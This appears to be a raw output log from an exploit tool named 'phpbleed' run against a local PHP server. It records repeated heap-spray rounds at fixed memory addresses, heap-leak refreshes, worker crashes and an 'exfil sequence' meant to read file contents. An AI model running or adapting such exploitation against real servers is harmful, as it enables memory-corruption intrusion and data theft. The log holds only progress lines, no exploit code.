+18:34:37Z [#425] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:37Z [#426] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:37Z [#427] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:37Z [#428] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:37Z [#429] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:37Z [#430] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:37Z [#431] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:37Z [#432] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:37Z [#433] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:37Z [#434] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:37Z [#435] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:37Z [#436] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:37Z [#437] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:37Z [#438] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:37Z [#439] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:37Z [#440] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:37Z [#441] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:37Z [#442] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:37Z [#443] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:37Z [#444] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:37Z [#445] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:37Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:37Z [R-6 round 6] no slot; refreshing R-1 heap leak
+18:34:37Z [#446] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:37Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:37Z [#447] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:37Z [#448] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:37Z [#449] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:37Z [#450] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:37Z [#451] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:37Z [#452] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:37Z [#453] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:37Z [#454] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:37Z [#455] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:37Z [#456] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:37Z [#457] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:37Z [#458] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:37Z [#459] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:37Z [#460] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:37Z [#461] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:37Z [#462] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:37Z [#463] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:37Z [#464] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:37Z [#465] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:37Z [#466] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:37Z [#467] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:37Z [#468] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:37Z [#469] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:37Z [#470] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:37Z [#471] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:37Z [#472] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:37Z [#473] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:37Z [#474] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:37Z [#475] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:37Z [#476] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:37Z [#477] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:37Z [#478] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:37Z [#479] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:37Z [#480] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:37Z [#481] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:37Z [#482] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:37Z [#483] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:37Z [#484] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:37Z [#485] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:38Z [#486] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6] FAILED round 6 (spray slot not found)
+18:34:38Z [R-6/R-7 round 7] opening fresh worker pin
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:38Z [#487] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:38Z [#488] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:38Z [#489] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:38Z [#490] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:38Z [#491] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:38Z [#492] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:38Z [#493] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:38Z [#494] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:38Z [#495] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:38Z [#496] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:38Z [#497] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:38Z [#498] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:38Z [#499] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:38Z [#500] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:38Z [#501] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:38Z [#502] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:38Z [#503] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:38Z [#504] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:38Z [#505] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:38Z [#506] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:38Z [#507] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:38Z [#508] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:38Z [#509] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:38Z [#510] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:38Z [#511] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:38Z [#512] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:38Z [#513] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:38Z [#514] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:38Z [#515] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:38Z [#516] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:38Z [#517] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:38Z [#518] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:38Z [#519] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:38Z [#520] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:38Z [#521] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:38Z [#522] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:38Z [#523] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:38Z [#524] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:38Z [#525] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:38Z [#526] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6 round 7] no slot; refreshing R-1 heap leak
+18:34:38Z [#527] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:38Z [#528] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:38Z [#529] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:38Z [#530] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:38Z [#531] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:38Z [#532] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:38Z [#533] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:38Z [#534] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:38Z [#535] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:38Z [#536] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:38Z [#537] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:38Z [#538] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:38Z [#539] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:38Z [#540] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:38Z [#541] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:38Z [#542] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:38Z [#543] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:38Z [#544] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:38Z [#545] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:38Z [#546] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:38Z [#547] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:38Z [#548] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:38Z [#549] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:38Z [#550] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:38Z [#551] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:38Z [#552] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:38Z [#553] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:38Z [#554] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:38Z [#555] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:38Z [#556] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:38Z [#557] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:38Z [#558] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:38Z [#559] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:38Z [#560] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:38Z [#561] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:38Z [#562] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:38Z [#563] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:38Z [#564] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:38Z [#565] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:38Z [#566] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:38Z [#567] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6] FAILED round 7 (spray slot not found)
+18:34:38Z [R-6/R-7 round 8] opening fresh worker pin
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:38Z [#568] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:38Z [#569] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:38Z [#570] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:38Z [#571] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:38Z [#572] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:38Z [#573] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:38Z [#574] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:38Z [#575] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:38Z [#576] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:38Z [#577] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:38Z [#578] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:38Z [#579] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:38Z [#580] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:38Z [#581] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:38Z [#582] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:38Z [#583] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:38Z [#584] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:38Z [#585] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:38Z [#586] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:38Z [#587] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:38Z [#588] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:38Z [#589] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:38Z [#590] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:38Z [#591] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:38Z [#592] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:38Z [#593] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:38Z [#594] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:38Z [#595] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:38Z [#596] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:38Z [#597] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:38Z [#598] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:38Z [#599] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:38Z [#600] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:38Z [#601] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:38Z [#602] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:38Z [#603] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:38Z [#604] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:38Z [#605] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:38Z [#606] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:39Z [#607] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:39Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:39Z [R-6 round 8] no slot; refreshing R-1 heap leak
+18:34:39Z [#608] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:39Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:39Z [#609] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:39Z [#610] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:39Z [#611] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:39Z [#612] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:39Z [#613] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:39Z [#614] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:39Z [#615] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:39Z [#616] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:39Z [#617] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:39Z [#618] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:39Z [#619] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:39Z [#620] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:39Z [#621] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:39Z [#622] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:39Z [#623] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:39Z [#624] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:39Z [#625] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:39Z [#626] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:39Z [#627] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:39Z [#628] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:39Z [#629] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:39Z [#630] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:39Z [#631] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:39Z [#632] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:39Z [#633] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:39Z [#634] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:39Z [#635] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:39Z [#636] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:39Z [#637] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:39Z [#638] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:39Z [#639] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:39Z [#640] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:39Z [#641] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:39Z [#642] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:39Z [#643] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:39Z [#644] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:39Z [#645] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:39Z [#646] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:39Z [#647] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:39Z [#648] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:39Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:39Z [R-6] FAILED round 8 (spray slot not found)
+18:34:39Z [#649] [R-6 spray-slot] GET /f rawlen=491
+18:34:39Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:35:46Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:35:46Z [R-6/R-7 round 1] opening fresh worker pin
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:35:46Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:35:46Z [#2] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:35:46Z [#3] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:35:46Z [#4] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:35:46Z [#5] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:35:46Z [#6] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:35:46Z [#7] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
